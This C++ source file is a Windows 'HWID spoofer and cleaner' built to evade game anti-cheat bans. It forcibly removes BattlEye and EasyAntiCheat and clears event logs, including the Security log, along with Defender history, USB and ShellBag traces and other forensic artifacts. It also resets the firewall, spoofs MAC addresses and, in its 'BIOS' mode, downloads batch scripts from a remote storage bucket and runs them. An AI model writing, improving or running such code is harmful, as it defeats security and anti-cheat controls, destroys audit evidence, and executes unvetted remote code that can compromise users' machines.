#include "cleaner.h"
#include <Windows.h>
#include <cstdio>
#include <conio.h>

static void SafeCLS() {
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    if (!hOut || hOut == INVALID_HANDLE_VALUE) return;
    CONSOLE_SCREEN_BUFFER_INFO csbi;
    if (!GetConsoleScreenBufferInfo(hOut, &csbi)) return;
    DWORD cells = csbi.dwSize.X * csbi.dwSize.Y;
    DWORD written;
    COORD home = { 0, 0 };
    FillConsoleOutputCharacterA(hOut, ' ', cells, home, &written);
    FillConsoleOutputAttribute(hOut, csbi.wAttributes, cells, home, &written);
    SetConsoleCursorPosition(hOut, home);
}

static void PrintBanner() {
    SafeCLS();
    printf("\n");
    printf("  ============================================\n");
    printf("         HWID Spoofer & Cleaner Tool\n");
    printf("         Deep Clean  -  HWID Reset\n");
    printf("  ============================================\n\n");
    fflush(stdout);
}

static void PrintStep(const char* step) {
    printf("[*] %s...\n", step);
    fflush(stdout);
}

static void PrintOK()   { printf("    [ OK ]\n\n");  fflush(stdout); }
static void PrintFail() { printf("    [FAIL]\n\n");  fflush(stdout); }

static void PrintDone() {
    printf("\n============================================\n");
    printf("        CLEANING FINISHED\n");
    printf("============================================\n");
    printf("\nPress R to restart your PC now . . .\n");
    printf("Press any other key to return to menu . . .\n");
    fflush(stdout);
    int key = _getch();
    if (key == 'r' || key == 'R') {
        printf("\nRestarting system . . .\n");
        fflush(stdout);
        system("shutdown /r /t 3 /c \"Cleaner - restarting to apply changes\"");
        Sleep(5000);
    }
}

static void CommonCleanup() {
    PrintStep("Clearing browser cookies");
    system("del /f /s /q \"%localappdata%\\Microsoft\\Windows\\INetCookies\\*\" >nul 2>&1"); PrintOK();

    PrintStep("Clearing browser history");
    system("del /f /s /q \"%localappdata%\\Microsoft\\Windows\\History\\*\" >nul 2>&1"); PrintOK();

    PrintStep("Clearing browser cache");
    system("del /f /s /q \"%localappdata%\\Microsoft\\Windows\\INetCache\\*\" >nul 2>&1"); PrintOK();

    PrintStep("Clearing user temp files");
    system("del /f /s /q \"%localappdata%\\Temp\\*\" >nul 2>&1"); PrintOK();

    PrintStep("Clearing Windows temp");
    system("del /f /s /q C:\\Windows\\Temp\\* >nul 2>&1"); PrintOK();

    PrintStep("Clearing prefetch");
    system("del /f /s /q C:\\Windows\\Prefetch\\* >nul 2>&1"); PrintOK();

    PrintStep("Clearing C:\\Temp");
    system("del /f /s /q C:\\Temp\\* >nul 2>&1"); PrintOK();

    Sleep(200);

    PrintStep("Purging trace files");
    system("del /f /s /q \"%localappdata%\\Temp\\*.etl\" >nul 2>&1");
    system("del /f /s /q \"%localappdata%\\Temp\\*.log\" >nul 2>&1");
    system("del /f /s /q \"%localappdata%\\Temp\\*.tmp\" >nul 2>&1");
    system("del /f /s /q \"C:\\Windows\\Temp\\*.etl\" >nul 2>&1");
    system("del /f /s /q \"C:\\Windows\\Temp\\*.log\" >nul 2>&1");
    system("del /f /s /q \"C:\\Windows\\Temp\\*.tmp\" >nul 2>&1");
    system("del /f /s /q \"C:\\Windows\\Temp\\*.dmp\" >nul 2>&1");
    PrintOK();
}

static void RemoveBattlEye() {
    PrintStep("Deleting BattlEye service (ControlSet001)");
    system("REG DELETE \"HKLM\\SYSTEM\\ControlSet001\\Services\\BEService\" /f >nul 2>&1"); PrintOK();

    PrintStep("Deleting BattlEye service (CurrentControlSet)");
    system("REG DELETE \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\BEService\" /f >nul 2>&1"); PrintOK();

    PrintStep("Removing BattlEye executable");
    system("del /f /q \"C:\\Program Files (x86)\\Common Files\\BattlEye\\BEService.exe\" >nul 2>&1"); PrintOK();

    PrintStep("Removing BattlEye DLLs");
    system("del /f /q \"C:\\Program Files (x86)\\Common Files\\BattlEye\\*.dll\" >nul 2>&1"); PrintOK();

    PrintStep("Removing BattlEye folder");
    system("rmdir /s /q \"C:\\Program Files (x86)\\Common Files\\BattlEye\" >nul 2>&1"); PrintOK();

    Sleep(200);
}

static void RemoveEAC() {
    PrintStep("Taking ownership of EAC folder");
    system("takeown /f \"C:\\Program Files (x86)\\EasyAntiCheat\" /r /d y >nul 2>&1");
    system("icacls \"C:\\Program Files (x86)\\EasyAntiCheat\" /grant Administrators:F /t /c /q >nul 2>&1"); PrintOK();

    PrintStep("Deleting EAC service (ControlSet001)");
    system("REG DELETE \"HKLM\\SYSTEM\\ControlSet001\\Services\\EasyAntiCheat\" /f >nul 2>&1"); PrintOK();

    PrintStep("Deleting EAC service (CurrentControlSet)");
    system("REG DELETE \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\EasyAntiCheat\" /f >nul 2>&1"); PrintOK();

    PrintStep("Deleting EAC driver traces");
    system("REG DELETE \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinRing0_1_2_0\" /f >nul 2>&1"); PrintOK();

    PrintStep("Removing EAC program files folder");
    system("rmdir /s /q \"C:\\Program Files (x86)\\EasyAntiCheat\" >nul 2>&1"); PrintOK();

    PrintStep("Removing EAC system binaries");
    system("del /f /q \"C:\\Windows\\System32\\EasyAntiCheat.exe\" >nul 2>&1");
    system("del /f /q \"C:\\Windows\\SysWOW64\\EasyAntiCheat.exe\" >nul 2>&1"); PrintOK();

    PrintStep("Deleting EAC scheduled tasks");
    system("schtasks /delete /tn \"EasyAntiCheat\" /f >nul 2>&1"); PrintOK();

    PrintStep("Removing EAC cache");
    system("rmdir /s /q \"%localappdata%\\EasyAntiCheat\" >nul 2>&1"); PrintOK();

    PrintStep("Removing EAC app data");
    system("rmdir /s /q \"%appdata%\\EasyAntiCheat\" >nul 2>&1"); PrintOK();

    PrintStep("Removing EAC program data");
    system("rmdir /s /q \"%programdata%\\EasyAntiCheat\" >nul 2>&1"); PrintOK();

    Sleep(300);
}

static void WindowsTraceCleanup() {
    printf("\n--- WINDOWS TRACES ---\n\n"); fflush(stdout);

    PrintStep("Clearing event logs");
    system("wevtutil cl Application >nul 2>&1");
    system("wevtutil cl System >nul 2>&1");
    system("wevtutil cl Security >nul 2>&1");
    system("wevtutil cl Setup >nul 2>&1"); PrintOK();

    PrintStep("Clearing recent documents");
    system("del /f /s /q \"%appdata%\\Microsoft\\Windows\\Recent\\*\" >nul 2>&1"); PrintOK();

    PrintStep("Clearing Run history");
    system("reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\" /f >nul 2>&1"); PrintOK();

    PrintStep("Clearing jump lists");
    system("del /f /s /q \"%appdata%\\Microsoft\\Windows\\Recent\\AutomaticDestinations\\*\" >nul 2>&1");
    system("del /f /s /q \"%appdata%\\Microsoft\\Windows\\Recent\\CustomDestinations\\*\" >nul 2>&1"); PrintOK();

    PrintStep("Clearing Windows error reports");
    system("del /f /s /q \"%localappdata%\\Microsoft\\Windows\\WER\\*\" >nul 2>&1"); PrintOK();

    PrintStep("Clearing crash dumps");
    system("del /f /s /q \"C:\\Windows\\Minidump\\*\" >nul 2>&1");
    system("del /f /q \"C:\\Windows\\MEMORY.DMP\" >nul 2>&1"); PrintOK();

    PrintStep("Clearing GPU shader cache");
    system("del /f /s /q \"%localappdata%\\NVIDIA\\DXCache\\*\" >nul 2>&1");
    system("del /f /s /q \"%localappdata%\\NVIDIA\\GLCache\\*\" >nul 2>&1");
    system("del /f /s /q \"%localappdata%\\AMD\\DxCache\\*\" >nul 2>&1"); PrintOK();

    PrintStep("Clearing D3D shader cache");
    system("del /f /s /q \"%localappdata%\\D3DSCache\\*\" >nul 2>&1"); PrintOK();

    PrintStep("Clearing thumbnail cache");
    system("del /f /s /q \"%localappdata%\\Microsoft\\Windows\\Explorer\\thumbcache_*.db\" >nul 2>&1"); PrintOK();

    PrintStep("Emptying Recycle Bin");
    system("rd /s /q C:\\$Recycle.Bin >nul 2>&1"); PrintOK();

    PrintStep("Clearing RAC reliability data");
    system("del /f /s /q \"C:\\ProgramData\\Microsoft\\RAC\\PublishedData\\*\" >nul 2>&1");
    system("del /f /s /q \"C:\\ProgramData\\Microsoft\\RAC\\StateData\\*\" >nul 2>&1"); PrintOK();

    PrintStep("Clearing WDI diagnostic logs");
    system("del /f /s /q \"C:\\ProgramData\\Microsoft\\Windows\\WDI\\*\" >nul 2>&1"); PrintOK();

    PrintStep("Clearing Windows Defender scan history");
    system("del /f /s /q \"C:\\ProgramData\\Microsoft\\Windows Defender\\Scans\\History\\*\" >nul 2>&1");
    system("del /f /s /q \"C:\\ProgramData\\Microsoft\\Windows Defender\\Support\\*\" >nul 2>&1"); PrintOK();

    PrintStep("Clearing Windows Timeline");
    system("del /f /s /q \"%localappdata%\\ConnectedDevicesPlatform\\*\" >nul 2>&1"); PrintOK();

    PrintStep("Clearing live kernel reports");
    system("del /f /s /q \"C:\\Windows\\LiveKernelReports\\*\" >nul 2>&1"); PrintOK();

    Sleep(400);
}

static void RegistryDeepClean() {
    printf("\n--- REGISTRY DEEP CLEAN ---\n\n"); fflush(stdout);

    PrintStep("Clearing Rust/Facepunch (HKCU)");
    system("reg delete \"HKCU\\Software\\Facepunch Studios\" /f >nul 2>&1");
    system("reg delete \"HKCU\\Software\\Rust\" /f >nul 2>&1"); PrintOK();

    PrintStep("Clearing Rust/Facepunch (HKLM)");
    system("reg delete \"HKLM\\Software\\Facepunch Studios\" /f >nul 2>&1");
    system("reg delete \"HKLM\\Software\\WOW6432Node\\Facepunch Studios\" /f >nul 2>&1"); PrintOK();

    PrintStep("Clearing EAC registry (HKCU)");
    system("reg delete \"HKCU\\Software\\EasyAntiCheat\" /f >nul 2>&1"); PrintOK();

    PrintStep("Clearing EAC registry (HKLM)");
    system("reg delete \"HKLM\\Software\\EasyAntiCheat\" /f >nul 2>&1");
    system("reg delete \"HKLM\\Software\\WOW6432Node\\EasyAntiCheat\" /f >nul 2>&1"); PrintOK();

    PrintStep("Clearing Epic Games registry");
    system("reg delete \"HKLM\\Software\\Epic Games\" /f >nul 2>&1");
    system("reg delete \"HKLM\\Software\\WOW6432Node\\Epic Games\" /f >nul 2>&1");
    system("reg delete \"HKCU\\Software\\Epic Games\" /f >nul 2>&1"); PrintOK();

    PrintStep("Clearing Steam MRU entries");
    system("reg delete \"HKCU\\Software\\Valve\\Steam\" /v \"LastGameNameUsed\" /f >nul 2>&1");
    system("reg delete \"HKCU\\Software\\Valve\\Steam\" /v \"RunningAppID\" /f >nul 2>&1"); PrintOK();

    PrintStep("Clearing Windows MRU lists");
    system("reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\LastVisitedPidlMRU\" /f >nul 2>&1");
    system("reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\OpenSavePidlMRU\" /f >nul 2>&1"); PrintOK();

    PrintStep("Clearing UserAssist history");
    system("reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\" /f >nul 2>&1"); PrintOK();

    PrintStep("Clearing BAM traces");
    system("reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\bam\\State\\UserSettings\" /f >nul 2>&1"); PrintOK();

    PrintStep("Clearing AppCompatFlags");
    system("reg delete \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Store\" /f >nul 2>&1"); PrintOK();

    PrintStep("Clearing tray notification history");
    system("reg delete \"HKCU\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\CurrentVersion\\TrayNotify\" /f >nul 2>&1"); PrintOK();

    PrintStep("Clearing Shell Bags");
    system("reg delete \"HKCU\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\Bags\" /f >nul 2>&1");
    system("reg delete \"HKCU\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\BagMRU\" /f >nul 2>&1");
    system("reg delete \"HKCU\\Software\\Microsoft\\Windows\\Shell\\Bags\" /f >nul 2>&1");
    system("reg delete \"HKCU\\Software\\Microsoft\\Windows\\Shell\\BagMRU\" /f >nul 2>&1"); PrintOK();

    PrintStep("Clearing MountedDevices");
    system("reg delete \"HKLM\\SYSTEM\\MountedDevices\" /f >nul 2>&1"); PrintOK();

    PrintStep("Clearing USB device history");
    system("reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USB\" /f >nul 2>&1");
    system("reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR\" /f >nul 2>&1"); PrintOK();

    PrintStep("Clearing Portable Devices");
    system("reg delete \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Devices\" /f >nul 2>&1"); PrintOK();

    PrintStep("Clearing Steam registry");
    system("reg delete \"HKCU\\Software\\Valve\\Steam\\Users\" /f >nul 2>&1"); PrintOK();

    PrintStep("Clearing Steam client blob");
    system("del /f /q \"%programfiles(x86)%\\Steam\\clientregistry.blob\" >nul 2>&1");
    system("del /f /q \"C:\\Program Files\\Steam\\clientregistry.blob\" >nul 2>&1"); PrintOK();

    PrintStep("Displaying Machine GUID");
    printf("    "); fflush(stdout);
    system("reg query \"HKLM\\SOFTWARE\\Microsoft\\Cryptography\" /v MachineGuid 2>&1 | find \"MachineGuid\"");

    PrintStep("Displaying SMBIOS UUID");
    printf("    "); fflush(stdout);
    system("wmic csproduct get uuid 2>&1 | find \"-\"");

    Sleep(400);
}

static void NetworkReset() {
    printf("\n--- NETWORK RESET ---\n\n"); fflush(stdout);

    PrintStep("Flushing DNS cache");
    system("ipconfig /flushdns >nul 2>&1"); PrintOK();

    PrintStep("Resetting ARP cache");
    system("netsh interface ip delete arpcache >nul 2>&1"); PrintOK();

    PrintStep("Resetting NetBIOS");
    system("nbtstat -R >nul 2>&1"); PrintOK();

    PrintStep("Resetting Winsock");
    system("netsh winsock reset >nul 2>&1"); PrintOK();

    PrintStep("Resetting TCP/IP");
    system("netsh int ip reset >nul 2>&1"); PrintOK();

    PrintStep("Resetting firewall");
    system("netsh advfirewall reset >nul 2>&1"); PrintOK();

    PrintStep("Releasing DHCP");
    system("ipconfig /release >nul 2>&1"); PrintOK();

    PrintStep("Renewing DHCP");
    system("ipconfig /renew >nul 2>&1"); PrintOK();

    PrintStep("Resetting route table");
    system("route -f >nul 2>&1"); PrintOK();

    PrintStep("Clearing WiFi profiles");
    system("for /f \"skip=3 tokens=1*\" %i in ('netsh wlan show profiles ^| findstr \":\"') do netsh wlan delete profile name=\"%j\" >nul 2>&1"); PrintOK();

    PrintStep("Clearing network list");
    system("reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NetworkList\\Profiles\" /f >nul 2>&1");
    system("reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NetworkList\\Signatures\\Unmanaged\" /f >nul 2>&1"); PrintOK();

    Sleep(400);
}

static void MACSpoof() {
    printf("\n--- MAC ADDRESS SPOOFING ---\n\n"); fflush(stdout);

    PrintStep("Showing current MACs");
    system("wmic nic where \"NetEnabled=true\" get MACAddress,Description 2>&1 | find \":\"");

    PrintStep("Writing randomized MAC to registry");
    system("powershell -Command \"$mac='%02X-%02X-%02X-%02X-%02X-%02X' -f ((Get-Random 256) -band 0xFE),(Get-Random 256),(Get-Random 256),(Get-Random 256),(Get-Random 256),(Get-Random 256); Write-Host \\\"New MAC: $mac\\\"; Get-ChildItem 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E972-E325-11CE-BFC1-08002bE10318}' -ErrorAction SilentlyContinue | ForEach-Object { $key = $_.PSPath; $desc = (Get-ItemProperty -Path $key -Name DriverDesc -ErrorAction SilentlyContinue).DriverDesc; if ($desc -and $desc -notmatch 'Bluetooth|Virtual|WAN|TAP|Tunnel') { Write-Host \\\"Setting $desc -> $mac\\\"; Set-ItemProperty -Path $key -Name NetworkAddress -Value $mac.Replace('-','') -Force } }\" >nul 2>&1"); PrintOK();

    PrintStep("Cycling network adapters");
    system("powershell -Command \"Get-NetAdapter | Where-Object { $_.Virtual -eq $false -and $_.Name -notmatch 'Bluetooth|TAP|Tunnel' } | ForEach-Object { Write-Host \\\"Restarting $($_.Name)...\\\"; $_ | Disable-NetAdapter -Confirm:$false -ErrorAction SilentlyContinue; Start-Sleep 1; $_ | Enable-NetAdapter -Confirm:$false -ErrorAction SilentlyContinue }\" >nul 2>&1"); PrintOK();

    PrintStep("New MAC addresses");
    system("wmic nic where \"NetEnabled=true\" get MACAddress,Description 2>&1 | find \":\"");
}

void CleanFortnite() {
    PrintBanner();
    printf("    GAME: Fortnite\n\n");
    printf("--- PHASE 1: BROWSER & TEMP ---\n\n"); fflush(stdout);
    CommonCleanup();

    printf("--- PHASE 2: ANTI-CHEAT & GAME DATA ---\n\n"); fflush(stdout);

    RemoveBattlEye();
    RemoveEAC();

    PrintStep("Removing Fortnite game data");
    system("rmdir /s /q \"%localappdata%\\FortniteGame\" >nul 2>&1"); PrintOK();

    PrintStep("Removing Epic Games launcher data");
    system("rmdir /s /q \"%localappdata%\\EpicGamesLauncher\" >nul 2>&1"); PrintOK();

    PrintStep("Removing Epic Games app data");
    system("rmdir /s /q \"%appdata%\\EpicGamesLauncher\" >nul 2>&1"); PrintOK();

    RegistryDeepClean();
    WindowsTraceCleanup();
    NetworkReset();
    MACSpoof();
    PrintDone();
}

void CleanWarzone() {
    PrintBanner();
    printf("    GAME: Warzone\n\n");
    printf("--- PHASE 1: BROWSER & TEMP ---\n\n"); fflush(stdout);
    CommonCleanup();

    printf("--- PHASE 2: ANTI-CHEAT & GAME DATA ---\n\n"); fflush(stdout);

    RemoveBattlEye();

    PrintStep("Removing Activision local data");
    system("rmdir /s /q \"%localappdata%\\Activision\" >nul 2>&1"); PrintOK();

    PrintStep("Removing Activision app data");
    system("rmdir /s /q \"%appdata%\\Activision\" >nul 2>&1"); PrintOK();

    PrintStep("Removing Blizzard local data");
    system("rmdir /s /q \"%localappdata%\\Blizzard Entertainment\" >nul 2>&1"); PrintOK();

    PrintStep("Removing Battle.net app data");
    system("rmdir /s /q \"%appdata%\\Battle.net\" >nul 2>&1"); PrintOK();

    PrintStep("Removing Blizzard program data");
    system("rmdir /s /q \"%programdata%\\Blizzard Entertainment\" >nul 2>&1"); PrintOK();

    PrintStep("Removing Battle.net program data");
    system("rmdir /s /q \"%programdata%\\Battle.net\" >nul 2>&1"); PrintOK();

    RegistryDeepClean();
    WindowsTraceCleanup();
    NetworkReset();
    MACSpoof();
    PrintDone();
}

void CleanGame() {
    PrintBanner();
    printf("    GAME: Full 8-Phase Reset\n\n");

    printf("--- PHASE 1: BROWSER & TEMP ---\n\n"); fflush(stdout);
    CommonCleanup();

    printf("\n--- PHASE 2: NETWORK RESET ---\n\n"); fflush(stdout);
    NetworkReset();

    printf("\n--- PHASE 3: GAME DATA REMOVAL ---\n\n"); fflush(stdout);

    PrintStep("Removing Rust local data");
    system("rmdir /s /q \"%localappdata%\\Rust\" >nul 2>&1"); PrintOK();

    PrintStep("Removing Steam Rust userdata");
    system("rmdir /s /q \"%programfiles(x86)%\\Steam\\userdata\" >nul 2>&1"); PrintOK();

    PrintStep("Removing Steam Rust workshop data");
    system("rmdir /s /q \"%programfiles(x86)%\\Steam\\steamapps\\workshop\\content\\252490\" >nul 2>&1"); PrintOK();

    PrintStep("Removing Steam config cache");
    system("del /f /s /q \"%programfiles(x86)%\\Steam\\config\\*.vdf\" >nul 2>&1"); PrintOK();

    PrintStep("Removing Facepunch local data");
    system("rmdir /s /q \"%localappdata%\\Facepunch\" >nul 2>&1"); PrintOK();

    PrintStep("Removing Facepunch app data");
    system("rmdir /s /q \"%appdata%\\Facepunch\" >nul 2>&1"); PrintOK();

    PrintStep("Removing EAC cache");
    system("rmdir /s /q \"%localappdata%\\EasyAntiCheat\" >nul 2>&1"); PrintOK();

    PrintStep("Removing EAC app data");
    system("rmdir /s /q \"%appdata%\\EasyAntiCheat\" >nul 2>&1"); PrintOK();

    PrintStep("Removing EAC program data");
    system("rmdir /s /q \"%programdata%\\EasyAntiCheat\" >nul 2>&1"); PrintOK();

    Sleep(300);

    printf("\n--- PHASE 4: ANTI-CHEAT REMOVAL ---\n\n"); fflush(stdout);
    RemoveBattlEye();
    RemoveEAC();

    printf("\n--- PHASE 5: WINDOWS TRACES ---\n\n"); fflush(stdout);
    WindowsTraceCleanup();

    PrintStep("Clearing Windows update cache");
    system("del /f /s /q C:\\Windows\\SoftwareDistribution\\Download\\* >nul 2>&1"); PrintOK();

    PrintStep("Clearing Windows Search index");
    system("sc stop WSearch >nul 2>&1");
    system("del /f /s /q \"C:\\ProgramData\\Microsoft\\Search\\Data\\Applications\\Windows\\*\" >nul 2>&1");
    system("sc start WSearch >nul 2>&1"); PrintOK();

    printf("\n--- PHASE 6: REGISTRY DEEP CLEAN ---\n\n"); fflush(stdout);
    RegistryDeepClean();

    printf("\n--- PHASE 7: MAC ADDRESS SPOOF ---\n\n"); fflush(stdout);
    MACSpoof();

    printf("\n--- PHASE 8: FINAL CLEANUP ---\n\n"); fflush(stdout);

    PrintStep("Restarting Windows Explorer");
    system("taskkill /f /im explorer.exe >nul 2>&1");
    Sleep(400);
    system("start explorer.exe >nul 2>&1"); PrintOK();

    PrintStep("Volume information");
    printf("    "); fflush(stdout);
    system("vol C: 2>&1 | find \"Serial Number\"");

    PrintDone();
}

void CleanBootBIOS() {
    PrintBanner();
    printf("    MODE: BIOS Deep Clean (External Scripts)\n");
    printf("    WARNING: Downloads and runs external batch files!\n\n");
    printf("    Proceed? [Y/N]: ");
    fflush(stdout);
    int c = _getch();
    if (c != 'y' && c != 'Y') {
        printf("\n    Cancelled.\n\n");
        return;
    }
    printf("Y\n\n");

    const char* scripts[] = {
        "DeepClean.bat", "Tracers.bat", "Undetected.bat",
        "Deep.bat", "vms.bat", "CLP.bat", "MAC.bat"
    };

    for (int i = 0; i < 7; i++) {
        char buf[512];
        PrintStep(scripts[i]);
        snprintf(buf, 512, "curl -s -o C:\\Windows\\Temp\\%s \"https://nrnfvqxbipxevutkvqdc.supabase.co/storage/v1/object/public/asdfgfdgrte3t345rfer/lithiumrip/%s\" 2>&1", scripts[i], scripts[i]);
        if (system(buf) == 0) {
            printf("    Downloaded.\n");
            snprintf(buf, 512, "C:\\Windows\\Temp\\%s", scripts[i]);
            system(buf);
            printf("    Executed.\n\n");
        } else {
            PrintFail();
        }
        snprintf(buf, 512, "del /f /q C:\\Windows\\Temp\\%s 2>&1", scripts[i]);
        system(buf);
    }

    PrintDone();
}

void CleanerMenu() {
    while (true) {
        SafeCLS();

        printf("\n");
        printf("  ============================================\n");
        printf("         HWID Spoofer & Cleaner Tool\n");
        printf("         Deep Clean  -  HWID Reset\n");
        printf("  ============================================\n\n");
        printf("  Select game to clean:\n\n");
        printf("    [1]  Fortnite Cleaner\n");
        printf("    [2]  Warzone Cleaner\n");
        printf("    [3]  Game      (Full 8-Phase HWID Reset)\n");
        printf("    [4]  BIOS      (External Batch Scripts)\n");
        printf("    [5]  Return to Main Menu\n\n");
        printf("  ============================================\n");
        printf("  Choice [1-5]: ");
        fflush(stdout);

        int choice = _getch();
        printf("%c\n\n", choice);

        switch (choice) {
            case '1': CleanFortnite(); break;
            case '2': CleanWarzone(); break;
            case '3': CleanGame(); break;
            case '4': CleanBootBIOS(); break;
            case '5': return;
            default:
                printf("  Invalid choice. Press any key...\n");
                fflush(stdout);
                _getch();
                break;
        }
    }
}
